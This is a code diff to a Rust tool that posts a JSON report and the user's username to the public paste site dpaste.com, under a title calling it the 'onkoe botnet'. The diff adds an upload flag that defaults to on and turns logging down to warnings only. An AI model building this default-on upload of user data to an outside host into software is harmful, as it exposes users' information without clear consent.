@@ -14,6 +14,10 @@ struct Args {
     /// Saves a readable version to disk at this location.
     #[arg(short, long)]
     save_to: Option<String>,
+
+    /// Whether or not to upload the file to the web.
+    #[arg(short, long, default_value_t = true)]
+    upload: bool,
 }
 
 #[tokio::main(flavor = "current_thread")]
@@ -21,7 +25,7 @@ async fn main() {
     // add logging
     tracing_subscriber::fmt()
         .pretty()
-        .with_max_level(tracing::Level::DEBUG)
+        .with_max_level(tracing::Level::WARN)
         .init();
 
     // check args
@@ -63,36 +67,39 @@ async fn main() {
         println!("Saved report file to {}", path.display());
     }
 
-    // make parameters
-    let params = [
-        (
-            "title",
-            format!("welcome to the onkoe botnet, {}", whoami::username()),
-        ),
-        ("content", json),
-    ];
+    // only upload if the user says to
+    if args.upload {
+        // make parameters
+        let params = [
+            (
+                "title",
+                format!("welcome to the onkoe botnet, {}", whoami::username()),
+            ),
+            ("content", json),
+        ];
 
-    // define the server to send it to
-    const SERVER_IP: &str = "https://dpaste.com/api/v2/";
+        // define the server to send it to
+        const SERVER_IP: &str = "https://dpaste.com/api/v2/";
 
-    // make a reqwest client to speak w/ the server
-    let client = reqwest::Client::new();
+        // make a reqwest client to speak w/ the server
+        let client = reqwest::Client::new();
 
-    // use reqwest to send our report
-    let resp = client.post(SERVER_IP).form(&params).send().await;
+        // use reqwest to send our report
+        let resp = client.post(SERVER_IP).form(&params).send().await;
 
-    let resp = resp
-        .expect("post should work")
-        .error_for_status()
-        .expect("status should be happy");
-    let headers = resp.headers();
+        let resp = resp
+            .expect("post should work")
+            .error_for_status()
+            .expect("status should be happy");
+        let headers = resp.headers();
 
-    if let Some(Ok(url)) = headers.get("location").map(|url| url.to_str()) {
-        println!("{url}")
-    } else {
-        println!("Failed to reach server. Please try again!");
+        if let Some(Ok(url)) = headers.get("location").map(|url| url.to_str()) {
+            println!("{url}")
+        } else {
+            println!("Failed to reach server. Please try again!");
+        }
     }
 
-    println!("Press any key to continue...");
+    println!("All done! Press any key to continue...");
     let _ = rpassword::read_password();
 }
